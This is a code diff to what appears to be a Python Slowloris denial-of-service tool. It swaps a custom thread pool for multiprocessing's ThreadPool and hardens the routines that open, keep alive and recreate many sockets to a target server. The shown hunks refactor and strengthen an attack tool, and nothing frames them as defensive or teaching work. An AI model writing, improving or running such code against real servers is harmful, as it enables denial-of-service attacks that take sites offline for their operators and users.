@@ -3,51 +3,8 @@ import socket
 from sys import exit, stdout
 from time import sleep
 from random import randint
-from queue import Queue
-from threading import Thread
+from multiprocessing.pool import ThreadPool
 from . import logger
-
-
-class Worker(Thread):
-    '''Thread executing tasks from a given tasks queue'''
-    def __init__(self, tasks):
-        Thread.__init__(self)
-        self.tasks = tasks
-        self.daemon = True
-        self.start()
-
-    def run(self):
-        '''
-        `run` overrides the Thread class and will be the code run by the thread, it takes functions from the `tasks` queue and calls them with the arguments provided
-        '''
-        while True:
-            # Retrive the function and arguments from the `tasks` queue
-            func, args, kargs = self.tasks.get()
-
-            # Try to run it, outputs exception if failed
-            try:
-                func(*args, **kargs)
-            except Exception as e:
-                print(e)
-
-            # Removes the element from the queue
-            self.tasks.task_done()
-
-
-class ThreadPool:
-    '''Pool of threads consuming tasks from a queue'''
-    def __init__(self, num_threads):
-        self.tasks = Queue(num_threads)
-        for _ in range(num_threads):
-            Worker(self.tasks)
-
-    def add_task(self, func, *args, **kargs):
-        '''Add a task to the queue'''
-        self.tasks.put((func, args, kargs))
-
-    def wait_completion(self):
-        '''Wait for completion of all the tasks in the queue'''
-        self.tasks.join()
 
 
 class SlowLoris:
@@ -82,9 +39,12 @@ class SlowLoris:
         logger.info('Creating {} sockets'.format(self._sock_count))
         for _ in range(self._sock_count):
             # Addding the task to the thread pool queue
-            self.pool.add_task(self.init_socket)
-        self.pool.wait_completion()
-        logger.info('Done creating {} sockets'.format(len(self.sockets)))
+            self.pool.apply_async(self.init_socket)
+        self.pool.close()
+        self.pool.join()
+        logger.info('Created {} sockets'.format(len(self.sockets)))
+        if len(self.sockets) != self._sock_count:
+            raise Exception('Unable to create {} sockets!'.format(self._sock_count))
 
     def init_socket(self):
         '''
@@ -123,6 +83,7 @@ class SlowLoris:
         '''
         for sock in self.sockets:
             sock.close()
+        self.pool.terminate()
 
     def keep_alive(self):
         '''
@@ -134,7 +95,6 @@ class SlowLoris:
             except socket.error:
                 self.sockets.remove(sock)
         for _ in range(self._sock_count - len(self.sockets)):
-            logger.info('Recreating socket...')
-            self.pool.add_task(self.init_socket)
-        self.pool.wait_completion()
+            logger.debug('Recreating socket...')
+            self.init_socket()
         sleep(15)
